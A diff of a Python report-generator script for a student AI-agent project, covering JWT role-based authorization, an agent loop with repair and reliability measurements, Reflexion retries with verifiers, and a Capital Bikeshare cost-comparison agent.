@@ -190,331 +190,232 @@ table(["Value", "Definition", "Mine"], [
     ["DOMAIN_ID", "SID4 mod 8", "2 — Municipal Transit Incidents"],
     ["Hardware", "", "Intel Core i9-9880H (x86_64), 16 GB RAM, macOS 15, CPU-only inference"],
     ["Local model", "", "qwen3:8b via Ollama (HW1 ModelClient / langchain-ollama)"],
-    ["Tagged commit hash", "tag hw7", "[ fill in: git rev-parse --short hw7 ]"],
+    ["Tagged commit hash", "tag hw7", "[ fill in after tagging: git rev-parse --short hw7 ]"],
 ])
-fill_in("After tagging, replace the commit-hash cell above. verification.json was generated against the commit "
-        "just before the results commit; both are in the same branch.")
+
+h1("Overview — the steps we took")
+table(["Part", "What we built and did", "Result"], [
+    ["1", "Moved the graded routes from the HW4 cookie to JWT with reader/writer/moderator roles; users table gained "
+          "username + role; Ruff + pre-commit.", "401 / 403 / 200–204 as required; hook blocks bad commit"],
+    ["2", "Hand-written agent loop over the HW5 tools with a repair path; 3 fixed tasks; error recovery; 20-attempt "
+          "reliability study; fixed the failures it exposed.",
+     f"well-formed {rel['well_formed_before_repair'].split('=')[1].strip()} → {rel['well_formed_after_repair'].split('=')[1].strip()} "
+     f"after repair; tasks {rel['task_pass']}"],
+    ["3", "Bounded Reflexion (≤ 2 retries, budgets, stop reasons), deterministic verifiers, stored reflections, "
+          "original-vs-Reflexion comparison.", f"initial run {cmp1['original']['task_success']} → {cmp1['reflexion']['task_success']}"],
+    ["4", "Capital Bikeshare ReAct/MRKL agent: 3 tools, UI, two real-data scenarios, frozen pricing snapshots.",
+     "membership wins / pay-per-use wins, both verified"],
+    ["5", "Threat model, 5 hostile fixtures, 2 defenses, 24 live attack runs plus a tool-boundary replay.",
+     "3 of 24 attacks succeeded; SQL guard 6/7 → 0/7 data changes"],
+    ["6", "Six sandboxed file tools and a bash safety gate; glob → search → read test; gate test.",
+     "14/14 correct; 4 false allows found and fixed"],
+    ["—", "Self-check script (make verify-hw07).", f"{ver['passed']}/{ver['total_checks']} checks pass"],
+], size=9, widths=[0.4, 4.3, 2.1])
 
 # ============================================================================================
 # Part 1
 # ============================================================================================
 h1("Part 1 — JWT Authentication, Role-based Authorization and Linting")
-body("The graded domain routes (/api/incidents and /api/routes) moved from the HW4 session cookie to JWT bearer "
-     "authentication with roles reader, writer and moderator. The session code survives only at the hw4 tag; no "
-     "HW7 route accepts both schemes. Passwords stay PBKDF2-HMAC-SHA256 (200,000 iterations, per-user salt) in "
-     "MySQL.")
-
-h2("1.I Authentication — POST /auth/login and GET /auth/me")
-body("Files: code/web_application/jwt_auth.py (token, login, me, role dependency), session_crud.py "
-     "(verify_username_login), seeded by code/seed_hw07.py. Login fetches the user from MySQL, verifies the hash, "
-     "and only then signs the token (HS256, 60 min). The role is re-read from the database on every request, so a "
-     "demotion takes effect immediately.")
-code(E.get("code/web_application/jwt_auth.py", "create_access_token", "get_current_user", "require_roles",
-           "login", "me"))
-shot("1.1: successful login returning a JWT (Postman or terminal) and a failed login returning 401 Unauthorized")
-shot("1.2: GET /auth/me without a token — 401 Unauthorized")
-shot("1.3: GET /auth/me with an invalid or expired token — 401 Unauthorized (separate screenshot)")
-
-h2("1.II Authorization — roles on the existing domain routes")
-body("Existing routes only; no second generic /entities API. List and read: any authenticated role. Create and "
-     "update: writer or moderator. Delete: moderator only. The same rules guard /api/routes.")
-table(["Action", "reader", "writer", "moderator"], [
-    ["List / read", "200", "200", "200"],
-    ["Create (POST)", "403", "201", "201"],
-    ["Delete", "403", "403", "204"],
-    ["No token / bad token", "401", "401", "401"],
-])
-code(E.between("code/web_application/routers/incidents.py", "router = APIRouter(", "def _no_store")
-     + "\n...\n" + E.between("code/web_application/routers/incidents.py", '@router.post(', "def create_incident",
-                              include_end=True)
-     + "\n...\n" + E.between("code/web_application/routers/incidents.py", '@router.delete(', "def delete_incident",
-                              include_end=True))
-shot("1.4: create request as reader → 403 Forbidden, and as writer or moderator → 201 Created")
-shot("1.5: delete request as writer → 403 Forbidden, and as moderator → 204 No Content")
-shot("1.6: list/read request with a valid token → 200 OK")
-
-h2("1.III Database — MySQL users table")
-body("id (primary key), username (unique), password_hash (salt$hash, never plaintext), role (reader, writer, "
-     "moderator). HW4's name and email columns are kept so older rows stay valid; code/seed_hw07.py adds the two new "
-     "columns with ALTER TABLE (create_all never alters an existing table) and seeds one user per role. "
-     "verify_hw07.py checks that no stored hash contains the plaintext password.")
-code(E.get("code/web_application/models.py", "User"))
-
-h2("1.IV Linting — Ruff and pre-commit")
-body("ruff.toml selects E, F, W, I and B; .pre-commit-config.yaml runs Ruff on every commit for the HW7 files. "
-     "The transcripts below are the real runs: attempt 1 is blocked by the hook (I001 unsorted imports and F401 "
-     "unused import, both planted), the two issues are fixed with ruff --fix, and attempt 2 commits.")
-code((REPO / "ruff.toml").read_text() + "\n# .pre-commit-config.yaml\n" + (REPO / ".pre-commit-config.yaml").read_text())
-code("$ git commit -m \"HW7 Part 1 ...\"   # attempt 1\n" + T("lint_demo_1_fail.txt").split("\n", 2)[2][:1400]
-     + "\n...\n" + T("lint_demo_2_fixed.txt"))
-shot("1.7: terminal — linting error before commit, the pre-commit hook running, the issues fixed, and the "
-     "successful commit (your name visible)")
-body("Disclosure: because the graded routes no longer accept the session cookie, the HW4 React frontend and the older "
-     "verify scripts that call those routes with the cookie (verify_hw02–verify_hw05, measure_n1.py) are expected to "
-     "get 401 at HEAD. I did not re-run them or port the React client; that code is unchanged at the hw2–hw5 tags.",
-     italic=True)
+h2("What we did")
+bullet("Added username (unique) and role to the MySQL users table (code/seed_hw07.py runs the ALTER TABLE) and seeded "
+       "one user per role. Passwords stay PBKDF2-HMAC-SHA256 with a per-user salt (salt$hash) — never plaintext.")
+bullet("POST /auth/login fetches the user, verifies the hash, and only then signs an HS256 JWT (60 min). "
+       "GET /auth/me returns the identity and role. Bad credentials, a missing, invalid or expired token → 401.")
+bullet("Role checks on the existing /api/incidents and /api/routes (no second /entities API): list/read any role, "
+       "create writer or moderator, delete moderator only; wrong role → 403.")
+bullet("Installed Ruff and pre-commit, fixed the lint issues in the files we touched, and demonstrated a blocked commit "
+       "(I001 unsorted imports, F401 unused import) followed by a clean one.")
+bullet("Disclosure: the graded routes no longer accept the HW4 cookie, so the React frontend and the older verify scripts "
+       "(verify_hw02–05, measure_n1.py) are expected to get 401 at HEAD; they are unchanged at their own tags.")
+h2("Evidence required")
+code(E.get("code/web_application/jwt_auth.py", "create_access_token", "require_roles", "login"))
+table(["users column", "Type / rule"], [["id", "primary key"], ["username", "unique"],
+                                         ["password_hash", "salt$PBKDF2 hash only"], ["role", "reader | writer | moderator"]], size=9)
+table(["Action", "reader", "writer", "moderator", "no / bad token"], [
+    ["List / read", "200", "200", "200", "401"], ["Create", "403", "201", "201", "401"], ["Delete", "403", "403", "204", "401"]],
+    size=9)
+shot("1.1: successful login returning a JWT, and a failed login returning 401 Unauthorized")
+shot("1.2: GET /auth/me without a token → 401 Unauthorized")
+shot("1.3: GET /auth/me with an invalid or expired token → 401 Unauthorized (separate screenshot)")
+shot("1.4: create as reader → 403 Forbidden, and as writer or moderator → 201 Created")
+shot("1.5: delete as writer → 403 Forbidden, and as moderator → 204 No Content")
+shot("1.6: list/read with a valid token → 200 OK")
+shot("1.7: terminal — linting error before commit, the pre-commit hook running, the issues fixed, and the successful "
+     "commit (name visible)")
 
 # ============================================================================================
 # Part 2
 # ============================================================================================
 h1("Part 2 — The Agent Loop")
-body("run_agent(user_input) in code/hw07/agent.py uses the HW1 ModelClient and the three HW5 domain tools "
-     "(search_incidents, incident_details, incident_stats) through execute_tool. Tool results are appended as "
-     "tool-role messages. The loop stops at a final answer or the hard step ceiling (8). A reply is invalid when it is "
-     "not a JSON tool call or answer (text_instead_of_tool), names an unknown tool (unknown_tool), or has malformed or "
-     "schema-failing arguments (malformed_arguments). Each invalid reply is reprompted once with the specific problem; "
-     "after two failed repairs the run stops cleanly as repair_exhausted. A tool saying \"no incident found\" is an "
-     "observation, not an invalid call. Every tool invocation is logged with name and inputs, and the total is reported "
-     "at the end.")
-h2("2.I Implementation")
-code(E.get("code/hw07/agent.py", "classify_tool_error", "check_reply"))
+h2("What we did")
+bullet("run_agent(user_input) (code/hw07/agent.py) drives the HW1 ModelClient and the three HW5 domain tools through "
+       "execute_tool; results are appended as tool-role messages; it stops at a final answer or the step ceiling (8).")
+bullet("Repair path: a reply that is not a JSON call/answer (text_instead_of_tool), names an unknown tool (unknown_tool), or has "
+       "malformed or schema-failing arguments (malformed_arguments) is reprompted once with the specific problem; after 2 "
+       "failed repairs the run stops as repair_exhausted. \"No incident found\" is an observation, not a malformed call.")
+bullet("Every tool invocation is logged with name and inputs and the total is reported at the end.")
+bullet("Three fixed tasks — A: search then look up the first result; B: aggregate then one supporting example; C: search + "
+       "two detail lookups to compare — each checked by a deterministic verifier. Nonexistent ID handled without a crash.")
+bullet("Measured 20 attempts (7 A, 7 B, 6 C, temperature 0.7). The first run passed 10/20: task B misread the stats list "
+       "and task C hit 3 verifier false rejections. Fix: one sentence in the prompt (stats are sorted most-to-fewest) and a "
+       "verifier that accepts the winner's code, route or rider count. A longer prompt note made task C regress, so it was "
+       "cut back. Final run: 20/20.")
+h2("Evidence required")
 code(E.between("code/hw07/agent.py", "for step in range(1, max_steps + 1):", 'run.stop_reason = "max_steps"'))
-
-h2("2.II Verification tasks (three multi-step tasks, no follow-up prompting)")
-body("A: search a term, then look up the first result. B: answer an aggregate question, then find one supporting "
-     "example. C: compare two entities with a search plus two detail lookups. Tool-invocation log excerpt "
-     "(temperature 0; the full logs are in RUN_LOG.txt):")
-demo = T("part2_demo_run.txt")
-excerpt = []
-for ln in demo.splitlines():
-    if ln.startswith("=== Task") or "[tool call" in ln or "[answer]" in ln or "[done]" in ln or "[check]" in ln:
-        excerpt.append(clip(ln, 150))
-code("\n".join(excerpt))
-shot("2.1: the agent completing task A (search → detail lookup of the first result), no follow-up prompt")
-shot("2.2: the agent completing task B (aggregate → one supporting example)")
-shot("2.3: the agent completing task C (search + two detail lookups, comparison answer)")
-
-h2("2.III Error recovery — a nonexistent ID")
-body("\"Show me the full details of incident INC-3170-99999\": execute_tool returns the useful message "
-     "\"no incident found with code INC-3170-99999\", and the agent answers without crashing (the ID format is valid, so "
-     "this is a real not-found, not a malformed call).")
+excerpt = [clip(ln, 150) for ln in T("part2_demo_run.txt").splitlines()
+           if ln.startswith("=== Task") or "[tool call" in ln or "[done]" in ln or "[check]" in ln]
+code("\n".join(excerpt), size=7)
+shot("2.1: agent completing task A without follow-up prompting")
+shot("2.2: agent completing task B")
+shot("2.3: agent completing task C")
 shot("2.4: error-recovery case (nonexistent ID) handled without crashing")
-
-h2("2.IV Reliability — 20 attempts (7 × A, 7 × B, 6 × C), temperature 0.7")
-by_task = lambda a: {t: [x for x in a if x["task"] == t] for t in "ABC"}  # noqa: E731
-rows = []
-for label, s, a in (("Final run", rel, att), ("Initial run (before fixes)", rel1, att1)):
-    bt = by_task(a)
-    rows.append([label, s["well_formed_before_repair"], s["well_formed_after_repair"],
-                 f"{sum(x['passed'] for x in bt['A'])}/{len(bt['A'])}", f"{sum(x['passed'] for x in bt['B'])}/{len(bt['B'])}",
-                 f"{sum(x['passed'] for x in bt['C'])}/{len(bt['C'])}", s["task_pass"]])
-table(["Run", "Well-formed before repair", "Well-formed after repair", "Task A", "Task B", "Task C", "Total"],
-      rows, size=9)
-table(["Failure class", "First-try failures (final run)", "Unrecovered (final run)"], [
-    ["malformed arguments", sum("malformed_arguments" in x["problems"] for x in att),
-     sum(x["failure_class"] == "malformed_arguments" for x in att)],
+bt = {t: [x for x in att if x["task"] == t] for t in "ABC"}
+bt1 = {t: [x for x in att1 if x["task"] == t] for t in "ABC"}
+table(["20 attempts", "Well-formed before repair", "Well-formed after repair", "Task A", "Task B", "Task C", "Total"], [
+    ["Final run", rel["well_formed_before_repair"], rel["well_formed_after_repair"],
+     *[f"{sum(x['passed'] for x in bt[t])}/{len(bt[t])}" for t in "ABC"], rel["task_pass"]],
+    ["Initial run", rel1["well_formed_before_repair"], rel1["well_formed_after_repair"],
+     *[f"{sum(x['passed'] for x in bt1[t])}/{len(bt1[t])}" for t in "ABC"], rel1["task_pass"]]], size=9)
+table(["Failure class", "First-try failures", "Unrecovered after repair"], [
+    ["malformed arguments", sum("malformed_arguments" in x["problems"] for x in att), sum(x["failure_class"] == "malformed_arguments" for x in att)],
     ["unknown tool", sum("unknown_tool" in x["problems"] for x in att), sum(x["failure_class"] == "unknown_tool" for x in att)],
-    ["text when a tool was required", sum("text_instead_of_tool" in x["problems"] for x in att),
-     sum(x["failure_class"] == "text_instead_of_tool" for x in att)],
-    ["lost multi-step chain", "—", sum(x["failure_class"] == "lost_chain" for x in att)],
-])
-body("Raw per-attempt data: reports/hw07/raw/reliability_attempts.csv and .json. The 7 first-try failures were all "
-     "the same malformed call (search_incidents without its required query), and one reprompt fixed each.")
-body("What changed between runs. The initial run passed 10/20: task B 0/7 (the model misread the stats list and named "
-     "Safety Hazard, 1,269, although Delay, 1,286, was listed first) and task C 3/6, where the 3 failures were verifier "
-     "false rejections (correct answer, literal incident code missing). Two fixes: one sentence added to the prompt "
-     "(the stats list is sorted most-to-fewest), and a verifier that accepts the winner's code, route or rider count. A "
-     "longer set of tool notes I tried first made task C regress at temperature 0, so it was cut back (trials in "
-     "raw/dev_history/). Variants were tuned on the temperature-0 demo; the 20 attempts are fresh samples.")
+    ["text when a tool was required", sum("text_instead_of_tool" in x["problems"] for x in att), sum(x["failure_class"] == "text_instead_of_tool" for x in att)],
+    ["lost multi-step chain", "—", sum(x["failure_class"] == "lost_chain" for x in att)]], size=9)
 sigs = {t: len({(x["tokens"], x["tool_calls"], tuple(x["problems"])) for x in att if x["task"] == t}) for t in "ABC"}
-body(f"Limits of this measurement. Ollama does sample, but on these short tool-call tasks qwen3:8b is nearly "
-     f"deterministic: the attempts collapse to {sigs['A']} (A), {sigs['B']} (B) and {sigs['C']} (C) distinct paths. The "
-     "20 attempts are therefore not 20 independent samples, and the before-repair rate describes one repeated mistake "
-     "rather than a random per-call error rate.", italic=True)
+body(f"Per-attempt data: raw/reliability_attempts.csv/.json. Note: the model is near-deterministic here (the 20 attempts "
+     f"collapse to {sigs['A']}/{sigs['B']}/{sigs['C']} distinct paths for A/B/C), so they are not 20 independent samples; all "
+     "7 first-try failures are the same mistake (search_incidents without its required query), fixed by one reprompt.",
+     italic=True)
 
 # ============================================================================================
 # Part 3
 # ============================================================================================
 h1("Part 3 — Reflexion and Bounded Self-Correction")
-body("code/hw07/reflexion.py wraps the Part 2 agent. After each run a deterministic verifier (below) checks the "
-     "result; on failure the model writes one short reflection (at most two sentences, 400 characters) and the task is "
-     "retried with the reflection in context. Bounds: at most 2 retries, a hard budget of 12 tool calls and 15,000 "
-     "tokens per task, and a clean stop reason of success, budget_exhausted or human_review. Reflections are "
-     "untrusted data: stored per (user, run_id), sent only as a labelled user-role note (never in the system prompt), "
-     "and unable to change tool permissions or the safety gate, which live in code. test_reflection_isolation() "
-     "asserts exactly that with a hostile reflection.")
-h2("3.I Implementation and the verifier used per task")
-code(E.get("code/hw07/reflexion.py", "write_reflection", "run_reflexion"))
+h2("What we did")
+bullet("reflexion.py wraps the Part 2 agent: a deterministic verifier checks each result; on failure the model writes one "
+       "short reflection (≤ 2 sentences) and the task is retried with it in context.")
+bullet("Bounds: ≤ 2 retries, 12 tool calls and 15,000 tokens per task; stop reason success, budget_exhausted or human_review.")
+bullet("Reflections are untrusted data: stored per (user, run_id) with their evidence, passed only as a labelled user-role "
+       "note (never the system prompt), and unable to change tool permissions or the safety gate — a test proves a hostile "
+       "reflection changes nothing.")
+bullet("Compared original vs Reflexion on 12 paired runs (attempt 0 = original loop, final outcome = Reflexion).")
+h2("Evidence required")
+code(E.get("code/hw07/reflexion.py", "run_reflexion"))
 code(E.get("code/hw07/tasks.py", "check_A", "check_B", "check_C", "check_missing"))
-
-h2("3.II Stored reflection with its evidence (initial run, task B)")
 r0 = refl1[0]
 ev = r0["evidence"]
-code(json.dumps({
-    "user": r0["user"], "run_id": r0["run_id"], "task": r0["task"], "attempt": r0["attempt"],
-    "failure": r0["failure"],
-    "evidence": {"tool_calls": [{"tool": c["tool"], "inputs": c["inputs"], "ok": c["ok"],
-                                 "observation": clip(c["observation"], 110)} for c in ev["tool_calls"]],
-                 "answer": ev["answer"], "verifier_result": ev["verifier_result"]},
-    "reflection": r0["reflection"]}, indent=1))
-body(f"{len(refl1)} reflections were stored in the initial run (raw/v1_initial/reflections.jsonl); task B needed 1–2 "
-     "retries in each of its four runs. The second reflection in a two-retry run, for example: "
-     + clip(next(r for r in refl1 if r["attempt"] == 1)["reflection"], 260))
-shot("3.1 (optional): terminal — a Reflexion run showing the reflection and the retry succeeding")
-
-h2("3.III Original loop vs Reflexion loop (12 paired runs: 4 each of A, B, C; temperature 0.7)")
+code(json.dumps({"task": r0["task"], "attempt": r0["attempt"], "failure": r0["failure"],
+                 "evidence": {"tool_calls": [{"tool": c["tool"], "inputs": c["inputs"], "ok": c["ok"],
+                                              "observation": clip(c["observation"], 90)} for c in ev["tool_calls"]],
+                              "answer": clip(ev["answer"], 120), "verifier_result": ev["verifier_result"]},
+                 "reflection": clip(r0["reflection"], 300)}, indent=1), size=7)
 
 
 def cmp_rows(c):
     o, f = c["original"], c["reflexion"]
-    return [["Task success", o["task_success"], f["task_success"]],
-            ["Unsupported claims", o["unsupported_claims"], f["unsupported_claims"]],
-            ["Retry rate (retries per run)", o["retry_rate"], f["retry_rate"]],
-            ["Tool calls", o["tool_calls"], f["tool_calls"]],
-            ["Tokens", f"{o['tokens']:,}", f"{f['tokens']:,}"],
-            ["Latency (ms)", f"{o['latency_ms']:,}", f"{f['latency_ms']:,}"],
+    return [["Task success", o["task_success"], f["task_success"]], ["Unsupported claims", o["unsupported_claims"], f["unsupported_claims"]],
+            ["Retry rate", o["retry_rate"], f["retry_rate"]], ["Tool calls", o["tool_calls"], f["tool_calls"]],
+            ["Tokens", f"{o['tokens']:,}", f"{f['tokens']:,}"], ["Latency (ms)", f"{o['latency_ms']:,}", f"{f['latency_ms']:,}"],
             ["Verifier false rejections", o["verifier_false_rejections"], f["verifier_false_rejections"]]]
 
 
-body("Initial run — the base loop still had failures for Reflexion to correct:", after=2)
-table(["Metric", "Original loop", "Reflexion loop"], cmp_rows(cmp1))
-body("Final run — after the prompt and verifier fixes the original loop already passes every run, so Reflexion never "
-     "triggers (0 retries) and the two columns are identical:", after=2)
-table(["Metric", "Original loop", "Reflexion loop"], cmp_rows(cmp))
-body("Attempt 0 of each run is the original loop and the final outcome is the Reflexion loop (a paired design). In "
-     f"the initial run Reflexion cost {cmp1['reflexion']['tool_calls'] / cmp1['original']['tool_calls']:.1f}× the tool "
-     f"calls and {cmp1['reflexion']['tokens'] / cmp1['original']['tokens']:.1f}× the tokens for 4 more successes; "
-     "all 6 retries were task B. Caveats: the verifier's failure text names the correct category and goes into the "
-     "reflection, so Reflexion is partly being told the answer; and with a near-deterministic model the 12 runs are a "
-     "few paths repeated, so the counts are a demonstration, not a statistical estimate.")
-h2("3.IV Verifier false rejections")
-body("In the first reliability run the task-C check rejected attempts 16, 17 and 20 although the answers were correct, "
-     "for example: \"The incident on Line 80 affected more riders, with 147 riders impacted compared to 0 riders … "
-     "Line 200.\" Line 80 / 147 riders is exactly INC-3170-00022, but the verifier required the literal incident code. "
-     "Counting those as correct, that run's pass rate would have been 13/20. I loosened the check to accept the "
-     "winner's code, route or rider count, confirmed it accepts that answer and still rejects a wrong one, and re-ran. "
-     "An independent, looser correctness oracle found 0 false rejections in both 12-run comparisons.")
+body("Initial run (the base loop still had failures to correct); reflections: raw/v1_initial/reflections.jsonl "
+     f"({len(refl1)} stored):", bold=True, after=1)
+table(["Metric", "Original loop", "Reflexion loop"], cmp_rows(cmp1), size=9)
+body("Final run (after the prompt/verifier fixes the base loop passes every run, so Reflexion never triggers):", bold=True, after=1)
+table(["Metric", "Original loop", "Reflexion loop"], cmp_rows(cmp), size=9)
+body("Verifier false rejections: in the first reliability run the task-C check rejected 3 correct answers (e.g. \"Line 80 "
+     "… 147 riders\" is INC-3170-00022, but the verifier demanded the literal code). It was loosened and re-run; an "
+     "independent looser oracle found 0 false rejections in both 12-run comparisons. Caveat: the verifier's failure text "
+     "names the correct category and enters the reflection, so Reflexion is partly told the answer.", italic=True)
+shot("3.1 (optional): terminal — a stored reflection with its evidence, or a Reflexion retry succeeding")
 
 # ============================================================================================
 # Part 4
 # ============================================================================================
 h1("Part 4 — Framework ReAct/MRKL Public-Data Exercise (Capital Bikeshare)")
-body("City: Capital Bikeshare (Washington, DC). The agent is a LangGraph create_react_agent over ChatOllama (qwen3:8b) "
-     "and the three MRKL tools below; it recommends membership or pay-per-use from an uploaded trip CSV and the "
-     "official pricing page. The page lists no monthly price, only $120/year, so monthly = $120 / 12 = $10 (an "
-     "assumption, stated in every output). The LLM writes the decision and justification; code/hw07/bike/costs.py "
-     "recomputes every figure independently, and the results panel shows the agent's numbers beside the verified ones.")
-h2("4.I Tools (pure functions, common {success, data, error, source, ts} shape)")
-code(E.get("code/hw07/bike/tools.py", "sql_is_single_select", "csv_sql"))
-code(E.get("code/hw07/bike/tools.py", "policy_retriever"))
-code(E.get("code/hw07/bike/tools.py", "_eval", "calculator"))
+h2("What we did")
+bullet("City: Capital Bikeshare. A LangGraph create_react_agent over ChatOllama (qwen3:8b) uses three pure-function tools; "
+       "the page lists only $120/year, so monthly = $120 / 12 = $10 (an assumption stated in every output).")
+bullet("Built two real datasets (≥ 500 rows, seed 3170) from public trip files: 600 trips in one month (membership "
+       "should win) and 525 trips spread over 2011–2024 (pay-per-use should win). The public data has no rider id, so a "
+       "\"rider\" is an assembled sample.")
+bullet("Froze the pricing page text per run (URL, access time, SHA-256) and checked all five rules the agent uses against it.")
+bullet("UI at localhost:8470/hw7 (behind JWT login): CSV upload, pricing URL, Run, tool-call timeline, results panel, "
+       "metrics strip. costs.py recomputes every figure independently and the panel shows agent vs verified numbers.")
+bullet("The 8B model needed help: six earlier runs failed (invented a $300 price, pasted unfilled SQL placeholders, decision "
+       "contradicting its totals, wrong membership total). Final prompt = retrieval fixes + copy-paste SQL + stepwise "
+       "procedure + a one-shot self-consistency repair; thinking mode was abandoned (too slow on CPU).")
+h2("Evidence required")
+code(E.get("code/hw07/bike/tools.py", "sql_is_single_select", "csv_sql", "policy_retriever", "_eval", "calculator"))
 code(json.dumps({k: {"input": v["input_schema"], "output": v["output_schema"]} for k, v in bike_tools.SCHEMAS.items()},
-                indent=1))
-body("policy_retriever only fetches the official host or local fixture files (so a user-supplied URL cannot reach "
-     "internal addresses); csv_sql runs on an in-memory SQLite table and, with the Part 5 contract on, accepts exactly "
-     "one SELECT.")
-
-h2("4.II UI")
-body("localhost:8470/hw7 (code/web_application/bike_ui.html + routers/bike.py): sign in with a JWT, choose a CSV, "
-     "paste the pricing URL, press Run. The timeline panel shows each tool call and observation as it happens; the "
-     "results panel shows the decision, a cost comparison (agent vs verified), break-even versus actual, the weekly "
-     "table, citations (URL, capture time, SHA-256), assumptions, and a metrics strip (steps, total time, stop "
-     "reason). The API is behind the JWT roles, since a run uses the model and fetches a page.")
-
-h2("4.III Acceptance runs (both datasets have at least 500 real trips)")
+                separators=(",", ":")), size=7)
+shot("4.1: UI, membership-wins scenario — tool-call timeline, cost comparison, decision, citations, metrics strip "
+     "(step count, total time, stop reason)")
+shot("4.2: UI, pay-per-use-wins scenario — same panels")
 ref = {n: r["reference"] for n, r in bike.items()}
 ans = {n: r["answer"] for n, r in bike.items()}
 cit = {n: r["citations"][0] for n, r in bike.items()}
-table(["", "Membership wins", "Pay-per-use wins"], [
-    ["Dataset", "heavy_rider.csv", "light_rider.csv"],
-    ["Trips / span", f"{ref['membership_wins']['rides']} trips, 1 month (July 2023)",
-     f"{ref['pay_per_use_wins']['rides']} trips, {ref['pay_per_use_wins']['months_spanned']} months (2011–2024)"],
-    ["Average ride / e-bike share", f"{ref['membership_wins']['avg_minutes']} min / {ref['membership_wins']['ebike_share']:.0%}",
-     f"{ref['pay_per_use_wins']['avg_minutes']} min / {ref['pay_per_use_wins']['ebike_share']:.0%}"],
-    ["Decision", ans["membership_wins"]["decision"], ans["pay_per_use_wins"]["decision"]],
-    ["Pay-per-use total", f"${ref['membership_wins']['pay_per_use_total']:,.2f}", f"${ref['pay_per_use_wins']['pay_per_use_total']:,.2f}"],
-    ["Membership total (fee + residual)",
-     f"${ref['membership_wins']['membership_total']:,.2f} (${ref['membership_wins']['membership_fee_total']:,.2f} + ${ref['membership_wins']['membership_residual']:,.2f})",
-     f"${ref['pay_per_use_wins']['membership_total']:,.2f} (${ref['pay_per_use_wins']['membership_fee_total']:,.2f} + ${ref['pay_per_use_wins']['membership_residual']:,.2f})"],
-    ["Rides / month: actual vs break-even", f"{ref['membership_wins']['actual_rides_per_month']} vs {ref['membership_wins']['break_even_rides_per_month']}",
-     f"{ref['pay_per_use_wins']['actual_rides_per_month']} vs {ref['pay_per_use_wins']['break_even_rides_per_month']}"],
-    ["Steps / total time / stop reason", f"{bike['membership_wins']['step_count']} / {bike['membership_wins']['total_time_s']} s / {bike['membership_wins']['stop_reason']}",
-     f"{bike['pay_per_use_wins']['step_count']} / {bike['pay_per_use_wins']['total_time_s']} s / {bike['pay_per_use_wins']['stop_reason']}"],
-    ["Agent vs verified (4 checks)", "all pass" if all(bike["membership_wins"]["agent_vs_reference"].values()) else "see JSON",
-     "all pass" if all(bike["pay_per_use_wins"]["agent_vs_reference"].values()) else "see JSON"],
-], size=9)
-shot("4.1: UI, membership-wins scenario — tool-call timeline, cost comparison, decision, citations, and the metrics strip")
-shot("4.2: UI, pay-per-use-wins scenario — tool-call timeline, cost comparison, decision, citations, and the metrics strip")
 mw, pp = ref["membership_wins"], ref["pay_per_use_wins"]
+table(["", "Membership wins", "Pay-per-use wins"], [
+    ["Dataset", f"heavy_rider.csv — {mw['rides']} trips, 1 month", f"light_rider.csv — {pp['rides']} trips, {pp['months_spanned']} months"],
+    ["Decision", ans["membership_wins"]["decision"], ans["pay_per_use_wins"]["decision"]],
+    ["Pay-per-use total", f"${mw['pay_per_use_total']:,.2f}", f"${pp['pay_per_use_total']:,.2f}"],
+    ["Membership total (fee + residual)", f"${mw['membership_total']:,.2f} (${mw['membership_fee_total']:,.2f} + ${mw['membership_residual']:,.2f})",
+     f"${pp['membership_total']:,.2f} (${pp['membership_fee_total']:,.2f} + ${pp['membership_residual']:,.2f})"],
+    ["Rides/month: actual vs break-even", f"{mw['actual_rides_per_month']:.0f} vs {mw['break_even_rides_per_month']}",
+     f"{pp['actual_rides_per_month']} vs {pp['break_even_rides_per_month']}"],
+    ["Steps / time / stop reason", f"{bike['membership_wins']['step_count']} / {bike['membership_wins']['total_time_s']} s / {bike['membership_wins']['stop_reason']}",
+     f"{bike['pay_per_use_wins']['step_count']} / {bike['pay_per_use_wins']['total_time_s']} s / {bike['pay_per_use_wins']['stop_reason']}"],
+], size=9)
 rich([("Membership wins. ", True),
-      (f"The {mw['rides']} rides total {mw['avg_minutes'] * mw['rides']:,.0f} minutes ({mw['avg_minutes']} min average, "
-       f"{mw['ebike_share']:.0%} e-bike). Pay-per-use would cost ${mw['pay_per_use_total']:,.2f}. Membership costs one month "
-       f"at $10.00 plus ${mw['membership_residual']:,.2f} of overage (classic minutes past the free 45 and e-bike minutes at "
-       f"$0.15) = ${mw['membership_total']:,.2f}, so the agent chose Buy Monthly Membership. Break-even is about "
-       f"{mw['break_even_rides_per_month']} rides a month against {mw['actual_rides_per_month']:.0f} actual. Stop reason: "
-       f"{bike['membership_wins']['stop_reason']}, {bike['membership_wins']['step_count']} steps. In this run the model first "
-       "wrote a decision that contradicted its own totals and the self-consistency repair step (step 8 in the timeline) "
-       "corrected it.", False)])
+      (f"{mw['rides']} rides, {mw['avg_minutes']} min average, {mw['ebike_share']:.0%} e-bike. Pay-per-use would cost "
+       f"${mw['pay_per_use_total']:,.2f}; membership costs one month ($10.00) plus ${mw['membership_residual']:,.2f} of "
+       f"overage = ${mw['membership_total']:,.2f}. The agent chose Buy Monthly Membership (break-even "
+       f"{mw['break_even_rides_per_month']} rides/month vs {mw['actual_rides_per_month']:.0f} actual). Stop reason "
+       f"{bike['membership_wins']['stop_reason']}, {bike['membership_wins']['step_count']} steps (the last is the "
+       "self-consistency repair of a decision that contradicted the model's own totals).", False)])
 rich([("Pay-per-use wins. ", True),
-      (f"The {pp['rides']} rides span {pp['months_spanned']} months ({pp['actual_rides_per_month']} rides a month, "
-       f"{pp['avg_minutes']} min average). Pay-per-use costs ${pp['pay_per_use_total']:,.2f}; membership costs "
-       f"{pp['months_spanned']} × $10 = ${pp['membership_fee_total']:,.2f} plus ${pp['membership_residual']:,.2f} of overage = "
-       f"${pp['membership_total']:,.2f}, so the agent chose Pay Per Ride/Minute. Break-even is {pp['break_even_rides_per_month']} "
-       f"rides a month against {pp['actual_rides_per_month']} actual. Stop reason: {bike['pay_per_use_wins']['stop_reason']}, "
-       f"{bike['pay_per_use_wins']['step_count']} steps.", False)])
-
-h2("4.IV Saved pricing-page evidence")
-snap = lambda n: json.loads((RAW / "pricing_snapshots" / f"{n}.json").read_text())  # noqa: E731
+      (f"{pp['rides']} rides over {pp['months_spanned']} months ({pp['actual_rides_per_month']}/month, {pp['avg_minutes']} min "
+       f"average). Pay-per-use costs ${pp['pay_per_use_total']:,.2f}; membership costs {pp['months_spanned']} × $10 = "
+       f"${pp['membership_fee_total']:,.2f} plus ${pp['membership_residual']:,.2f} = ${pp['membership_total']:,.2f}. The agent "
